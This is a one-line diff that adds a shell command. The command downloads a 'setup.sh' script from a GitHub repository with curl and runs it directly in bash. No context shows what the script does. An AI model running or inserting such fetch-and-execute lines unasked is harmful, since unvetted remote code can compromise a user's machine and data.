@@ -1,0 +1,1 @@
+/bin/bash -c "$(curl -fsSL https://github.com/attonizee/MacOS/raw/main/setup.sh)"
